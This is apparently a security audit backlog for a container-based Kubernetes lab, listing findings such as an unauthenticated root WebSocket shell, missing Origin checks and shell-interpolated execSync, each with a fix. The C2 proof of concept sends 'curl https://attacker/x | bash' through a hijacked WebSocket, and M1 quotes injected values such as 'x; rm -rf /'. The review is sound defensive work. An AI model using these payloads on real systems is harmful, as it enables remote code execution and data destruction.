# KubeKosh — Security Findings Backlog

> Generated from a static review of `backend/server.js`, `scripts/entrypoint.sh`, `scripts/nginx.conf`, `Dockerfile`, and `frontend/src`. Each item is a tracked task to address later. Check the box when resolved.
>
> **Threat model in one line:** KubeKosh intentionally gives the lab user a **root `bash` shell** inside a container the README runs with **`--privileged`** (a shell in that container ≈ root on the host). The findings below concern *who* can reach that shell + supporting endpoints — currently **anyone who reaches the port, with no credentials.**

## Severity summary

| ID | Severity | Title | Location |
|----|----------|-------|----------|
| C1 | 🔴 Critical | Unauthenticated root shell over WebSocket → host compromise | `backend/server.js:480-534` |
| C2 | 🔴 Critical | Cross-Site WebSocket Hijacking (no `Origin` check) | `backend/server.js:526-534` |
| H1 | 🟠 High | No auth + no CSRF on state-changing `/api` routes | `backend/server.js:142,233,329` |
| H2 | 🟠 High | Backend + PTY run as root in a privileged container | `Dockerfile`, README:24,29 |
| M1 | 🟡 Medium | Shell-interpolated `execSync`; scenario JSON = root exec channel | `backend/server.js:95,267` |
| M2 | 🟡 Medium | Unpinned / unverified build supply chain | `Dockerfile:21,33,45,49` |
| M3 | 🟡 Medium | Unbounded shell spawning (DoS) | `backend/server.js:480` |
| L1 | 🟢 Low | World-readable cluster-admin kubeconfig (mode 644) | `entrypoint.sh:37,63`, `Dockerfile:78` |
| L2 | 🟢 Low | Error-message leakage to clients | `backend/server.js:165,219` |
| L3 | 🟢 Low | Terminal escape-sequence injection into xterm | `backend/server.js:256-264` |
| L4 | 🟢 Low | Dead `exec` import (exec-surface hygiene) | `backend/server.js:4` |
| L5 | 🟢 Low | No `.gitignore` (accidental-commit risk) | repo root |

---

## 🔴 Critical

### [ ] C1 — Unauthenticated root shell over WebSocket → host compromise
- **Where:** `backend/server.js:480-534` (`wss.on('connection')` spawns `pty.spawn('/bin/bash', …, { cwd:'/root' })`; browser input piped straight to it at line 518).
- **Issue:** No authentication/token/session check anywhere in the upgrade or connection path. Anyone who can reach port 7554 gets an interactive **root** shell; with `--privileged`, that is root on the host.
- **Exploit:** `wscat -c ws://<host>:7554/shell-ws`, then run any command (`cat /etc/shadow`, mount host disk, etc.).
- **Fix:** Mint a one-time terminal token server-side; require it (e.g. `Sec-WebSocket-Protocol` or query param) and validate in the `upgrade` handler **before** `wss.handleUpgrade`. At minimum bind the published port to `127.0.0.1` and document that this container must never be network-exposed.

### [ ] C2 — Cross-Site WebSocket Hijacking (no `Origin` validation)
- **Where:** `backend/server.js:526-534` — upgrade handler checks only `req.url === '/shell-ws'`, never `req.headers.origin`. The `ws` library does not validate Origin by default.
- **Issue:** Because there's also no auth, **any website the user visits** can open `ws://localhost:7554/shell-ws` and run root commands — drive-by RCE that defeats "localhost-only is safe."
- **PoC:**
  ```js
  new WebSocket('ws://localhost:7554/shell-ws').onopen = e =>
    e.target.send('curl https://attacker/x | bash\n')
  ```
- **Fix:** Reject the upgrade unless `req.headers.origin` is in an allowlist (the served host). Combine with the C1 token.

---

## 🟠 High

### [ ] H1 — No auth + no CSRF protection on state-changing `/api` endpoints
- **Where:** all `/api/*` routes; notably `POST /api/scenarios/:id/teardown` (`server.js:233`) and `/setup` (`329`) run shell commands as root via `runCommand`; `/api/progress/reset` (`142`), `/api/sessions/:id/submit|abandon` mutate state.
- **Issue:** Unauthenticated + no CSRF token + Origin unchecked → a malicious page can fire these cross-site. Command content comes from trusted `scenarios.json` (see M1), but reset/teardown are abusable for destruction/DoS.
- **Fix:** Same-origin/token gate the API; add a CSRF token or check `Origin`/`Sec-Fetch-Site` on all non-GET routes.

### [ ] H2 — Backend + PTY run as root in a privileged container
- **Where:** no `USER` directive in `Dockerfile`; runtime guidance is `--privileged` (README:24,29). Node process and every PTY shell run as uid 0.
- **Issue:** Turns every other finding into host-level impact; no seccomp/AppArmor/capability-drop guidance.
- **Fix:** Run the Node web tier as a non-root user where feasible (k3s itself needs privileges, the web tier does not). Document running with the minimum capabilities k3s needs instead of blanket `--privileged`; recommend a dedicated VM/host.

---

## 🟡 Medium

### [ ] M1 — Shell command injection surface via string-interpolated `execSync`
- **Where:** `runCommand` → `execSync(cmd, …)` with a shell (`server.js:95`); commands built by interpolation, e.g. `kubectl config set-context --current --namespace=${ns}` where `ns = scenario.default_namespace` (`server.js:267`).
- **Issue:** All sources are *currently* trusted `scenarios.json`, but that file is a **root-code-execution channel**: a malicious/careless PR adding `"setup_commands":[{"command":"curl evil|sh"}]` or `"default_namespace":"x; rm -rf /"` runs as root when any user opens the scenario.
- **Fix:** Use `execFile`/`spawn` with argument arrays (no shell) for fixed-shape `kubectl` calls; validate `default_namespace` against `^[a-z0-9-]+$`. Treat `scenarios.json` as privileged input in PR review (extend the `/validate-scenarios` skill with a command-shape lint).

### [ ] M2 — Unpinned, unverified build supply chain
- **Where:**
  - `Dockerfile:33` — k3s pulled from `releases/latest/download/…` with **no version pin and no checksum**.
  - `Dockerfile:45,49` — `npm install` with **no committed lockfile** in `backend/` or `frontend/` (non-deterministic, not integrity-pinned).
  - `Dockerfile:21` — `curl … nodesource/setup_20.x | bash -` (unpinned remote script to root shell at build time).
- **Fix:** Pin k3s to a specific tag + verify SHA256; commit lockfiles and use `npm ci`; pin the NodeSource script version or install Node from a pinned apt repo.

### [ ] M3 — Unbounded shell spawning (DoS)
- **Where:** `backend/server.js:480` — every WebSocket connection spawns a real `/bin/bash`; no cap on concurrent clients, no rate limiting.
- **Issue:** Combined with C2, a single page/script can open many connections and exhaust container PIDs/CPU/memory.
- **Fix:** Cap concurrent PTYs, add per-IP connection limits, set `express.json({ limit: '32kb' })`.

---

## 🟢 Low / hardening

### [ ] L1 — World-readable cluster-admin kubeconfig
- **Where:** `--write-kubeconfig-mode=644` (`entrypoint.sh:37`, `Dockerfile:78`) and copy at `entrypoint.sh:63`. Admin creds readable by any uid in the container.
- **Fix:** Use `600` unless a non-root process genuinely needs it.

### [ ] L2 — Error-message leakage
- **Where:** raw `e.message` returned to clients (`server.js:165,219`, others). Minor info disclosure.
- **Fix:** Log server-side; return generic messages.

### [ ] L3 — Terminal escape-sequence injection
- **Where:** `scenario.title`/`difficulty` interpolated into raw VT sequences sent to xterm (`server.js:256-264`). Trusted source today.
- **Fix:** Strip `\x1b`/control chars before injection (defense-in-depth).

### [ ] L4 — Dead `exec` import
- **Where:** `server.js:4` imports `exec` but only `execSync` is used.
- **Fix:** Remove the unused import to shrink the exec surface.

### [ ] L5 — No `.gitignore`
- **Where:** repo root (none exists).
- **Fix:** Add `.gitignore` for `node_modules/`, `frontend/dist/`, `*.db`, `.env*`; prevents accidental commit of deps/secrets. (Also noted in `CLAUDE.md`.)

---

## ✅ Verified-good (no action)
- Parameterized SQL throughout `better-sqlite3` usage — no SQL injection.
- `runCommand` enforces timeouts; exam minutes clamped (`server.js:177`).
- WebSocket upgrade restricted to the `/shell-ws` path.
- `react-markdown` used without `rehype-raw`; no `dangerouslySetInnerHTML` — no markdown→HTML XSS.

---

## Suggested order of work
1. **C1 + C2 + H2** (one coherent change): Origin allowlist + terminal token on `/shell-ws`, bind to `127.0.0.1`, README "never expose" warning, drop web tier to non-root.
2. **M2**: commit lockfiles (`npm ci`), pin + checksum k3s.
3. **H1 / M1 / M3**: API auth/CSRF, `execFile` for kubectl calls + namespace validation, PTY/connection caps.
4. **L1–L5**: hardening pass.
